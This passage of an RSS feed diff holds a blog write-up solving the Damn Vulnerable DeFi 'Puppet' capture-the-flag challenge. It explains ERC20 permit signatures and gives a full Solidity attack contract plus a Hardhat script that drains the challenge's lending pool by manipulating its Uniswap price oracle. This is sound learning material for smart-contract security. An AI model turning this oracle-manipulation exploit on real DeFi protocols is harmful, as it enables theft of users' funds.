+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-javascript&#34; &gt;&lt;code&gt;
+it(&amp;#39;Execution&amp;#39;, async function () {
+    /** CODE YOUR SOLUTION HERE */
+
+    attack = await (await ethers.getContractFactory(&amp;#39;PuppetAttack&amp;#39;, player)).deploy(
+        player.address,
+        token.address,
+        lendingPool.address,
+        uniswapExchange.address,
+        {
+            // send most ETH to the attack contract, keeping some for gas
+            value: PLAYER_INITIAL_ETH_BALANCE - 1n * 10n**18n, 
+            gasLimit: 1e7
+        }
+    );
+});
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;The above code will fail, however, as there is a significant problem: for the attack contract to trade our DVTs, we need to allow our DVTs to be spent by the attack contract - how can we do this without using up another transaction?&lt;/p&gt;
+&lt;h1 id=&#34;erc20-permit-approvals&#34;&gt;ERC20 Permit Approvals&lt;/h1&gt;
+&lt;p&gt;We can&amp;rsquo;t simply &lt;code&gt;transfer&lt;/code&gt; our tokens to the attack contract, or &lt;code&gt;approve&lt;/code&gt; the attack contract to use our tokens, without a transaction.&lt;/p&gt;
+&lt;p&gt;Fortunately if we look closer at the DVT contract, we notice it uses &lt;a href=&#34;https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol&#34;&gt;solmate&amp;rsquo;s ERC20 implementation&lt;/a&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;solmate/src/tokens/ERC20.sol&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This particular implementation includes the &lt;code&gt;permit&lt;/code&gt; function, which was designed as a gas efficient way to &lt;code&gt;approve&lt;/code&gt; a spender. It is essentially an &lt;a href=&#34;https://eips.ethereum.org/EIPS/eip-2612&#34;&gt;extension to ERC20&lt;/a&gt; to allow others to spend your tokens &lt;strong&gt;in a single transaction&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;For example, say you wish to exchange some tokens. Normally you would need to call &lt;code&gt;approve(exchange, amount)&lt;/code&gt; to allow &lt;code&gt;exchange&lt;/code&gt; to spend &lt;code&gt;amount&lt;/code&gt; of your tokens, then the exchange can take your tokens by doing &lt;code&gt;transferFrom(you, exchange, amount)&lt;/code&gt;. This requires a total of 2 transactions, one from you and one from the exchange. &lt;strong&gt;There is no way to do both in the same transaction&lt;/strong&gt; (unless you are a contract).&lt;/p&gt;
+&lt;p&gt;With &lt;code&gt;permit&lt;/code&gt;, you can cryptographically sign a &lt;code&gt;Permit&lt;/code&gt; which contains details such as the &lt;code&gt;spender&lt;/code&gt; and &lt;code&gt;amount&lt;/code&gt;, obtaining a signature. Then, you send this signature to the exchange, which calls &lt;code&gt;permit&lt;/code&gt; on the token contract, approving &lt;code&gt;spender&lt;/code&gt; to spend &lt;code&gt;amount&lt;/code&gt; tokens. The key difference is that the signing is done off-chain, which means the exchange can &lt;strong&gt;obtain allowance to your tokens and spend them in the same transaction&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;This is perfect for our scenario, as our attacking contract cannot spend our DVTs without us sending or approving the DVTs first.&lt;/p&gt;
+&lt;h1 id=&#34;deterministic-contract-addresses&#34;&gt;Deterministic Contract Addresses&lt;/h1&gt;
+&lt;p&gt;There is another problem - we need to specify the &lt;code&gt;spender&lt;/code&gt; when signing a permit off-chain - how do we get our attack contract&amp;rsquo;s address before deploying it?&lt;/p&gt;
+&lt;p&gt;We can actually predict the contract&amp;rsquo;s address before its deployment, as &lt;a href=&#34;https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed&#34;&gt;contract addresses are deterministic&lt;/a&gt;, based off the deploying account&amp;rsquo;s address and nonce.&lt;/p&gt;
+&lt;p&gt;In our case, since Hardhat tests use same account addresses, we can simply deploy and print out the attack contract&amp;rsquo;s address, which will remain constant.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;it&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Execution&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; () {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;/** CODE YOUR SOLUTION HERE */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;attack&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ethers&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getContractFactory&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PuppetAttack&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;)).&lt;span style=&#34;color:#a6e22e&#34;&gt;deploy&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Attack contract: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;attack&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;contract&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PuppetAttack&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Deploying an empty contract as shown above gives us the attack contract&amp;rsquo;s address, which stays constant if we re-run the tests.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Attack contract: 0x8464135c8F25Da09e49BC8782676a84730C318bC
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;putting-it-all-together&#34;&gt;Putting it all together&lt;/h1&gt;
+&lt;p&gt;Figuring out how to sign the permit probably took the longest for this challenge. I eventually found &lt;a href=&#34;https://forum.openzeppelin.com/t/erc20-permit-call/34975&#34;&gt;this thread&lt;/a&gt; and modified the code to work. Afterwards I found &lt;a href=&#34;https://github.com/dmihal/eth-permit&#34;&gt;&lt;code&gt;eth-permit&lt;/code&gt;&lt;/a&gt; which required less code, but requires installing another node module, so I will show the original way I used.&lt;/p&gt;
+&lt;p&gt;Otherwise, most of the code is simply combining what was shown in the previous sections, with the addition of the permit.&lt;/p&gt;
+&lt;p&gt;Final attack contract code:
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;300&#34; type=&#34;checkbox&#34; checked /&gt;
+    &lt;label for=&#34;300&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;solidity&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;PuppetAttack.sol&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-solidity&#34; &gt;&lt;code&gt;
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import &amp;#34;../DamnValuableToken.sol&amp;#34;;
+import &amp;#34;./PuppetPool.sol&amp;#34;;
+import &amp;#34;./IUniswapExchange.sol&amp;#34;;
+
+/**
+ * @title PuppetAttack
+ * @author teddyctf (https://thesavageteddy.github.io/posts/puppet-damnvulnerabledefi/)
+ */
+
+contract PuppetAttack {
+    constructor (
+        address owner,
+        DamnValuableToken token,
+        PuppetPool lendingPool,
+        IUniswapExchange uniswapExchange,
+        address spender,
+        uint256 value,
+        uint256 deadline,
+        uint8 v, bytes32 r, bytes32 s
+    ) payable {
+        // use permit and transfer tokens to this contract
+        token.permit(
+            owner,
+            spender,
+            value,
+            deadline,
+            v, r, s
+        );
+        token.transferFrom(owner, address(this), value);
+
+        // swap all our DVTs for ETH
+        token.approve(address(uniswapExchange), value);
+        uniswapExchange.tokenToEthSwapInput(
+            value, // swap all our DVTs
+            9.9 * 10**18, // for 9.9 ETH minimum
+            block.timestamp &amp;#43; 3600 // deadline (not important)
+        );
+
+        // drain lending pool&amp;#39;s DVTs, sending them to owner (player)
+        uint256 lendingPoolBalance = token.balanceOf(address(lendingPool));
+        uint256 ethRequiredToDrain = lendingPool.calculateDepositRequired(
+            lendingPoolBalance
+        );
+        lendingPool.borrow{value: ethRequiredToDrain}(lendingPoolBalance, owner);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+&lt;/p&gt;
+&lt;p&gt;Relevant Hardhat solve script (full code &lt;a href=&#34;puppet.challenge.js&#34;&gt;here&lt;/a&gt;):&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;200&#34; type=&#34;checkbox&#34; checked /&gt;
+    &lt;label for=&#34;200&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;javascript&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;puppet.challenge.js&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-javascript&#34; &gt;&lt;code&gt;
+it(&amp;#39;Execution&amp;#39;, async function () {
+    /** CODE YOUR SOLUTION HERE */
+
+    // Attack contract address we obtained previously
+    let attackAddress = &amp;#34;0x8464135c8F25Da09e49BC8782676a84730C318bC&amp;#34;
+    let spender = attackAddress
+
+    // Hardhat requires a Wallet to obtain the signed
+    // transaction data, so make a Wallet for the player
+    const accounts = config.networks.hardhat.accounts;
+    const index = 1; // wallet of player
+    const playerWallet = ethers.Wallet.fromMnemonic(accounts.mnemonic, accounts.path &amp;#43; `/${index}`);
+
+    expect(playerWallet.address).eq(player.address)
+
+    const chainId = (await ethers.provider.getNetwork()).chainId
+    const nonce = await token.nonces(playerWallet.address)
+    const name = await token.name()
+
+    // Number of tokens to be sent
+    const value = 1000n * 10n**18n
+    
+    // Unix timestamp for deadline
+    const deadline = (await ethers.provider.getBlock(&amp;#39;latest&amp;#39;)).timestamp &amp;#43; 3600
+
+    // Define Signature
+    const domain = {
+        name: name,
+        version: &amp;#34;1&amp;#34;,
+        verifyingContract: token.address,
+        chainId: chainId,
+    }
+
+    // Define types
+    const types = {
+        Permit: [
+            {name: &amp;#34;owner&amp;#34;, type: &amp;#34;address&amp;#34;},
+            {name: &amp;#34;spender&amp;#34;, type: &amp;#34;address&amp;#34;},
+            {name: &amp;#34;value&amp;#34;, type: &amp;#34;uint256&amp;#34;},
+            {name: &amp;#34;nonce&amp;#34;, type: &amp;#34;uint256&amp;#34;},
+            {name: &amp;#34;deadline&amp;#34;, type: &amp;#34;uint256&amp;#34;},
+        ]
+    }
+
+    // Define transaction
+    const values = {
+        owner: playerWallet.address,
+        spender: spender,
+        value: value,
+        nonce: nonce,
+        deadline: deadline,
+    }
+
+    // Sign data
+    const signature = await playerWallet._signTypedData(domain, types, values);
+
+    // Split signature
+    const sig = ethers.utils.splitSignature(signature);
+
+    attack = await (await ethers.getContractFactory(&amp;#39;PuppetAttack&amp;#39;, player)).deploy(
+        player.address,
+        token.address,
+        lendingPool.address,
+        uniswapExchange.address,
+        spender,
+        value,
+        deadline,
+        sig.v, sig.r, sig.s,
+        {
+            // send most ETH to the attack contract, keeping some for gas
+            value: PLAYER_INITIAL_ETH_BALANCE - 1n * 10n**18n, 
+            gasLimit: 1e7
+        }
+    );
+});
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+
+  &lt;img src=&#34;./img/solved.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; max-width: 80%;&#34;  /&gt;
+
+
+&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;This challenge was interesting, and I learnt a lot about ERC20 permits and oracle manipulation. Despite being the first out of a set of three challenges, its difficulty deceived me with the one transaction requirement.&lt;/p&gt;
+&lt;p&gt;Huge thanks to &lt;a href=&#34;https://twitter.com/farazsth98&#34;&gt;&lt;code&gt;Faith&lt;/code&gt;&lt;/a&gt; for helping with the one transaction requirement, and for teaching me a lot throughout my Web3 learning journey.&lt;/p&gt;
+&lt;p&gt;As this is my first Web3 post, if I&amp;rsquo;ve made any errors or anything to improve on, please let me know on Discord &lt;code&gt;thesavageteddy&lt;/code&gt; or Twitter/X &lt;a href=&#34;https://twitter.com/teddyctf&#34;&gt;&lt;code&gt;@teddyctf&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Having almost finished DamnVulnerableDefi, I&amp;rsquo;m looking at getting into auditing contracts soon!&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;teddy / TheSavageTeddy&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
